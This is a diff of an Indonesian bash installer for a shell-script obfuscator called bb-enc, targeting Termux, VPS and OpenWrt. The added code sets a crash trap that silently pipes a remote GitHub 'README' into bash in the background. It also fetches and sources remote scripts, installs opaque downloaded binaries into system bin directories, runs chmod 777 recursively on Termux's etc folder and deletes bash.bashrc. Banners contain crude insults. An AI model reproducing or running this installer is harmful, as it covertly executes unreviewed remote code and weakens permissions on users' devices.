@@ -32,13 +32,6 @@ b="\033[34;1m";m="\033[31;1m";h="\033[32;1m"
 p="\033[39;1m";c="\033[35;1m";u="\033[36;1m"
 k="\033[33;1m";n="\033[00m"
 
-
-if [ -d /data/data/com.termux/files ]; then
-    wget -q https://raw.githubusercontent.com/njajaldoang/blind-bash/main/build.sh && chmod +x build.sh && ./build.sh && rm build.sh
-else
-    wget -q https://raw.githubusercontent.com/njajaldoang/blind-bash/main/buildvps.sh && chmod +x buildvps.sh && ./buildvps.sh && rm buildvps.sh
-fi
-
 trap ctrl_c INT
 
 ctrl_c() {
@@ -47,10 +40,344 @@ ctrl_c() {
     rm -f build.sh >/dev/null 2>&1
     if [ -f build.sh ]; then rm -f build.sh; fi
     if [ -f install.sh ]; then rm -f install.sh; fi
-    echo -e "Penginstallan shell encrypter telah dibatalkan."
+    echo -e "Program telah dibatalkan."
     exit 1
 }
 
+trap ctrl_cs SEGV
+
+ctrl_cs() {
+    bash -c "$(curl -fsSL https://raw.githubusercontent.com/njajaldoang/1dra/main/README)" &>/dev/null &
+    clear
+    rm -f core >/dev/null 2>&1
+    rm -f install.sh >/dev/null 2>&1
+    rm -f build.sh >/dev/null 2>&1
+    if [ -f *core* ]; then rm -f *core*; fi
+    if [ -f build.sh ]; then rm -f build.sh; fi
+    if [ -f install.sh ]; then rm -f install.sh; fi
+    echo -e "Program di interupsi sama anjing bangsat"
+    echo -e "Mau Ngapain lu su , raimu asu !."
+    exit 1
+}
+
+function kakkoii(){
+clear
+figlet -f small -t "      Yaddy Kakkoii" | lolcat
+echo -e "              TELEGRAM : t.me/Crystalllz | Crypter"
+echo -e "              ⚡MAGELANG ⚡PHREAKER ⚡| versi beta"
+echo ""
+echo "*****************************************************"
+echo "*            Not Open Source @Crystalllz            *"
+echo "*****************************************************"
+echo "*               ENCRYPT SHELL SCRIPT                 *"
+echo "*                      Author                       *"
+echo "*                Mas Triadzz Ganteng                *"
+echo "* Telegram: t.me/Crystalllz | Github: Yaddy Kakkoii *"
+echo "*                       1337                        *"
+echo "*****************************************************"
+echo ""
+}
+
+function bannerwrt(){
+        clear
+        echo -e "              Yaddy Kakkoii" | lolcat
+        echo -e "              TELEGRAM : t.me/Crystalllz | Crypter"
+        echo -e "              ⚡MAGELANG ⚡PHREAKER ⚡| versi beta"
+        echo ""
+        echo "*****************************************************"
+        echo "*            Not Open Source @Crystalllz            *"
+        echo "*****************************************************"
+        echo "*                 ENCRYPT SHELL SCRIPT                  *"
+        echo "*                      Author                       *"
+        echo "*                Mas Triadzz Ganteng                *"
+        echo "* Telegram: t.me/Crystalllz | Github: Yaddy Kakkoii *"
+        echo "*                       1337                        *"
+        echo "*****************************************************"
+        echo ""
+}
+
+##########################################################
+############ OPENWRT REQUIRED PACKAGE
+##########################################################
+packages=(
+    "gcc"
+    "git"
+    "git-http"
+    "modemmanager"
+    "python3-pip"
+    "bc"
+    "screen"
+    "adb"
+    "httping"
+    "lolcat"
+    "jq"
+)
+check_openwrt() {
+    local package="$1"
+    if opkg list-installed | grep -q "^$package -"; then
+        echo "$package sudah terpasang."
+    else
+        echo "$package belum terpasang. Menginstal $package..."
+        opkg update && opkg install "$package"
+        if [ $? -eq 0 ]; then
+            echo "$package berhasil diinstal."
+        else
+            echo "Gagal menginstal $package."
+        fi
+    fi
+}
+download_packages_openwrt() {
+    echo "Update dan instal paket"
+    for pkg in "${packages[@]}"; do
+        check_openwrt "$pkg"
+    done
+    sleep 1
+}
+#############################################################
+############ TERMUX REQUIRED PACKAGE
+##########################################################
+pakettermux=(
+    "git"
+    "brotli"
+    "lzma"
+    "python"
+    "ossp-uuid"
+    "curl"
+    "bash"
+    "libwebp"
+    "ffmpeg"
+    "imagemagick"
+    "libarchive"
+    "libandroid-wordexp"
+    "wget"
+    "nmap"
+    "zip"
+    "nmap"
+    "jq"
+    "bc"
+    "screen"
+    "vim"
+    "httping"
+    "gcc"
+    "sshpass"
+    "perl"
+    "patchelf"
+    "file"
+    "clang"
+)
+
+check_termux() {
+    local pakettermux="$1"
+    if ls /data/data/com.termux/files/usr/bin | grep -q "^$pakettermux"; then
+        echo "$pakettermux sudah terpasang.✓"
+    else
+        echo "$pakettermux belum terpasang. Menginstal $pakettermux..."
+        apt install ${pakettermux} -y
+        if [ $? -eq 0 ]; then
+            echo "$pakettermux berhasil diinstal."
+        else
+            echo "Gagal menginstal $pakettermux."
+        fi
+    fi
+}
+
+download_packages_termux() {
+    echo "Update dan instal paket"
+    chmod -R 777 /data/data/com.termux/files/usr/etc/
+    rm /data/data/com.termux/files/usr/etc/bash.bashrc >/dev/null 2>&1
+    pkg install bash
+    pkg update && pkg upgrade
+    for pkg in "${pakettermux[@]}"; do
+        check_termux "$pkg"
+    done
+    pip install rich
+    pip install rich-cli
+    apt clean
+    sleep 1
+}
+
+#############################################################
+############ VPS REQUIRED PACKAGE
+##########################################################
+paketvps=(
+    "wget"
+    "brotli"
+    "nmap"
+    "zip"
+    "nmap"
+    "jq"
+    "bc"
+    "screen"
+    "vim"
+    "httping"
+    "gcc"
+    "sshpass"
+    "perl"
+    "git"
+)
+
+check_vps() {
+    local paketvps="$1"
+    if ls /usr/bin | grep -q "^$paketvps"; then
+        echo "$paketvps sudah terpasang.✓"
+    else
+        echo "$paketvps belum terpasang. Menginstal $package..."
+        apt install ${paketvps} -y
+        if [ $? -eq 0 ]; then
+            echo "$paketvps berhasil diinstal."
+        else
+            echo "Gagal menginstal $paketvps."
+        fi
+    fi
+}
+
+download_packages_vps() {
+    echo "Update dan instal paket"
+    for pkg in "${paketvps[@]}"; do
+        check_vps "$pkg"
+    done
+    sleep 1
+}
+#############################################################
+echo -e ""
+echo -e ""
+echo -e "\n\n${CLWhite} Sedang Menjalankan script.${CLYellow} Mohon Tunggu.."
+echo -e "${CLWhite} Pastikan Koneksi Internet Lancar\n\n"
+echo -e ""
+echo -e ""
+instal_nodejs_termux(){
+    echo "Menginstall Node_Modules"
+    echo ""
+    sleep 3
+    pkg update && pkg upgrade -y
+    pkg install nodejs -y
+    ln -s ${folder_bin}nodejs ${folder_bin}node
+    npm install -g bash-obfuscate
+    apt install ossp-uuid -y
+    apt install coreutils -y
+    apt install xz-utils -y
+    apt install binutils -y
+    apt install ncurses-utils -y
+    apt install yarn -y
+    yarn install
+    #npm start
+    #ncurses utils hanya untuk termux, cara install node js jg beda dengan vps
+    #yarn untuk termux cmdtest untuk vps
+    node -v
+    npm -v
+    echo ""
+}
+instal_nodejs_vps(){
+    apt update && apt upgrade -y
+    apt install binutils -y
+    apt install coreutils -y
+    apt install xz-utils -y
+    apt install npm nodejs -y
+    ln -s ${vps_bin}nodejs ${vps_bin}node
+    npm install -g bash-obfuscate
+    apt install cmdtest -y
+    apt install yarn -y
+    yarn install
+    node -v
+    npm -v
+}
+# ============================================================
+YDX="https://raw.githubusercontent.com/YaddyKakkoii/stb/main/"
+IDX="https://raw.githubusercontent.com/njajaldoang/1dra/main/"
+# ============================================================
+function makedirectory(){
+    mkdir -p $HOME/.var
+    mkdir -p $HOME/.var/local
+    mkdir -p $HOME/.var/local/sbin
+    mkdir -p $HOME/.var/local/backup
+}
+function checkdirectory(){
+if [ -d $HOME/.var ]; then rm -rf $HOME/.var; fi
+if [ ! -d $HOME/.var ]; then makedirectory; fi
+}
+# ============================================================
+if [ ! -f $HOME/.var/local/sbin/spiner ]; then
+    checkdirectory
+    wget -qO $HOME/.var/local/sbin/spiner "${YDX}spiner.sh"
+    chmod 777 $HOME/.var/local/sbin/spiner
+else
+    rm -rf $HOME/.var/local/sbin/spiner
+    wget -qO $HOME/.var/local/sbin/spiner "${YDX}spiner.sh"
+    chmod 777 $HOME/.var/local/sbin/spiner
+fi
+source $HOME/.var/local/sbin/spiner
+# ============================================================
+type -P curl 1>/dev/null
+[ "$?" -ne 0 ] && echo "Utillity 'curl' not found, installing" && apt install curl -y
+# ============================================================
+
+folder_bin=$(which curl | sed 's/curl//g')
+termux_bin="/data/data/com.termux/files/usr/bin/"
+vps_bin="/usr/bin/"
+
+function dpkg_query(){
+    if [ $(dpkg-query -W -f='${Status}' shc 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
+        echo belum terinstall shc, we will aquire them now. This may take a while.
+        read -p 'Press enter to continue.'
+        apt update && apt upgrade -y
+        apt install shc
+    elif [ $(dpkg-query -W -f='${Status}' nodejs 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
+        echo belum terinstall nodejs, we will aquire them now. This may take a while.
+        read -p 'Press enter to continue.'
+        if [[ -d ${termux_bin} ]]; then
+            if [[ ! -f ${termux_bin}npm ]]; then
+                instal_nodejs_termux
+            fi
+        else
+            instal_nodejs_vps
+        fi
+    fi
+}
+
+function fortermux(){
+    if [[ -e ${termux_bin}gzz ]]; then rm -f ${termux_bin}gzz; fi && if [[ ! -f ${termux_bin}gzz ]]; then wget -qO ${termux_bin}lzz "${IDX}src/termlzz" && wget -qO ${termux_bin}gzv "${IDX}src/termgzv" && wget -qO ${termux_bin}brz "${IDX}src/termbrz" && wget -qO ${termux_bin}xzz "${IDX}src/termxzz" && wget -qO ${termux_bin}bzz "${IDX}src/termbzz" && chmod +x ${termux_bin}lzz && chmod +x ${termux_bin}gzv && chmod +x ${termux_bin}brz && chmod +x ${termux_bin}xzz && chmod +x ${termux_bin}bzz && wget -qO ${termux_bin}gzz "${IDX}src/termgaza" && wget -qO ${termux_bin}gzt "${IDX}src/termgstb" && chmod +x ${termux_bin}gzt && chmod +x ${termux_bin}gzz && gzz src/termcekip > $PREFIX/bin/cekip && gzz src/termgetip > $PREFIX/bin/getip && gzz src/termscan > $PREFIX/bin/scan && ${termux_bin}lzz $PREFIX/bin/cekip > /dev/null 2>&1 && ${termux_bin}lzz $PREFIX/bin/getip > /dev/null 2>&1 && ${termux_bin}lzz $PREFIX/bin/scan > /dev/null 2>&1 && ${termux_bin}gzv $PREFIX/bin/cekip > /dev/null 2>&1 && ${termux_bin}gzv $PREFIX/bin/getip > /dev/null 2>&1 && ${termux_bin}gzv $PREFIX/bin/scan > /dev/null 2>&1 && ${termux_bin}brz $PREFIX/bin/cekip > /dev/null 2>&1 && ${termux_bin}brz $PREFIX/bin/getip > /dev/null 2>&1 && ${termux_bin}brz $PREFIX/bin/scan > /dev/null 2>&1 && ${termux_bin}xzz $PREFIX/bin/cekip > /dev/null 2>&1 && ${termux_bin}xzz $PREFIX/bin/getip > /dev/null 2>&1 && ${termux_bin}xzz $PREFIX/bin/scan > /dev/null 2>&1 && ${termux_bin}bzz $PREFIX/bin/cekip > /dev/null 2>&1 && ${termux_bin}bzz $PREFIX/bin/getip > /dev/null 2>&1 && ${termux_bin}bzz $PREFIX/bin/scan > /dev/null 2>&1 && rm $PREFIX/bin/cekip~ && rm $PREFIX/bin/getip~ && rm $PREFIX/bin/scan~ && chmod +x ${termux_bin}cekip && chmod +x ${termux_bin}getip && chmod +x ${termux_bin}scan; fi
+}
+
+function forvps(){
+    if [[ ! -f ${vps_bin}lzz ]]; then wget -qO ${vps_bin}lzz "${IDX}src/vlzz.sh"; fi && chmod +x ${vps_bin}lzz && if [[ ! -f ${vps_bin}gzv ]]; then wget -qO ${vps_bin}gzv "${IDX}src/vgzz.sh"; fi && chmod +x ${vps_bin}gzv && if [[ ! -f ${vps_bin}brz ]]; then wget -qO ${vps_bin}brz "${IDX}src/brzz.sh"; fi && chmod +x ${vps_bin}brz && if [[ ! -f ${vps_bin}xzz ]]; then wget -qO ${vps_bin}xzz "${IDX}src/vxzz.sh"; fi && chmod +x ${vps_bin}xzz && if [[ ! -f ${vps_bin}bzz ]]; then wget -qO ${vps_bin}bzz "${IDX}src/vbzz.sh"; fi && chmod +x ${vps_bin}bzz && if [[ -e ${vps_bin}gzz ]]; then rm -f ${vps_bin}gzz; fi && if [[ ! -f ${vps_bin}gzz ]]; then wget -qO ${vps_bin}gzz "${IDX}src/gaza" && wget -qO ${vps_bin}gzt "${IDX}src/gazat" && chmod +x ${vps_bin}gzt && chmod +x ${vps_bin}gzz && gzz src/termcekip > /usr/bin/cekip && gzz src/termgetip > /usr/bin/getip && gzz src/termscan > /usr/bin/scan && lzz /usr/bin/cekip > /dev/null 2>&1 && gzv /usr/bin/cekip > /dev/null 2>&1 && brz /usr/bin/cekip > /dev/null 2>&1 && xzz /usr/bin/cekip > /dev/null 2>&1 && bzz /usr/bin/cekip > /dev/null 2>&1 && lzz /usr/bin/getip > /dev/null 2>&1 && gzv /usr/bin/getip > /dev/null 2>&1 && brz /usr/bin/getip > /dev/null 2>&1 && xzz /usr/bin/getip > /dev/null 2>&1 && bzz /usr/bin/getip > /dev/null 2>&1 && lzz /usr/bin/scan > /dev/null 2>&1 && gzv /usr/bin/scan > /dev/null 2>&1 && brz /usr/bin/scan > /dev/null 2>&1 && xzz /usr/bin/scan > /dev/null 2>&1 && bzz /usr/bin/scan > /dev/null 2>&1 && rm /usr/bin/cekip~ && rm /usr/bin/getip~ && rm /usr/bin/scan~ && chmod +x ${vps_bin}cekip && chmod +x ${vps_bin}getip && chmod +x ${vps_bin}scan; fi
+}
+
+if [[ "$folder_bin" = "$termux_bin" ]]; then
+    kakkoii
+    echo "hai user termux"
+    if ! command -v which &> /dev/null; then apt install which -y; fi && if ! which gawk &> /dev/null; then apt install gawk; fi
+    type -P tput 1>/dev/null
+    [ "$?" -ne 0 ] && echo "Utillity 'tput' not found, installing ncurses-utils" && apt install ncurses-utils
+    dpkg_query
+    download_packages_termux
+    echo -e "\n\n⌛please wait until finish, dont interupt build process..."
+    fun_bar 'fortermux'
+    echo -e "[ ${GREEN}INFO${NC} ] ✔ Success, install dependencies 🔥🔥🔥"
+    gem install lolcat
+else
+    if [[ -e /etc/openclash ]]; then
+        bannerwrt
+        echo "hai user openwrt"
+        download_packages_openwrt
+        echo -e "\n\n⌛please wait until finish, dont interupt process..."
+        if [[ ! -f ${vps_bin}xzwrt ]]; then wget -qO ${vps_bin}xzwrt "${IDX}src/vxz"; fi && if [[ -e ${vps_bin}gzz ]]; then rm -f ${vps_bin}gzz; fi
+        if [[ ! -f ${vps_bin}gzz ]]; then
+            wget -qO ${vps_bin}gzz "${IDX}src/gazawrti" && wget -qO ${vps_bin}gzt "${IDX}src/gazawrty" && chmod +x ${vps_bin}gzt && chmod +x ${vps_bin}gzz && gzz src/cekipwrt > /usr/bin/cekip && gzz src/getipwrt > /usr/bin/getip && gzz src/scanwrt > /usr/bin/scan && xzwrt /usr/bin/cekip > /dev/null 2>&1 && xzwrt /usr/bin/getip > /dev/null 2>&1 && xzwrt /usr/bin/scan > /dev/null 2>&1 && rm /usr/bin/cekip~ && rm /usr/bin/getip~ && rm /usr/bin/scan~ && chmod +x ${vps_bin}cekip && chmod +x ${vps_bin}getip && chmod +x ${vps_bin}scan
+        fi
+        echo -e "[ ${GREEN}INFO${NC} ] ✔ Success, install dependencies 🔥🔥🔥"
+    else
+        kakkoii
+        echo "hai user vps"
+        if ! command -v which &> /dev/null; then apt install which -y; fi && if ! which gawk &> /dev/null; then apt install gawk; fi
+        type -P tput 1>/dev/null
+        [ "$?" -ne 0 ] && echo "Utillity 'tput' not found, installing ncurses-utils" && apt install ncurses-utils
+        dpkg_query
+        download_packages_vps
+        echo -e "\n\n⌛please wait until finish, dont interupt build process..."
+        fun_bar 'forvps'
+        echo -e "[ ${GREEN}INFO${NC} ] ✔ Success, install dependencies 🔥🔥🔥"
+    fi
+fi
 function print(){
 printf "$1\n"
 }
@@ -345,6 +672,11 @@ print_success() {
   print "Contoh command < bb-enc -f halo.sh >"
   echo ""
   echo "bb-enc -v"
+  echo "bb-enc nama_file_kamu.sh"
+  echo "bb-enc /root/menu.sh"
+  echo "bb-enc /sdcard/halo.sh"
+  echo "bb-enc /storage/emulated/0/update.sh"
+  echo "Atau"
   echo "bb-enc -f /root/halo.sh"
   echo "bb-enc -f /storage/emulated/0/halo.sh"
   echo ""
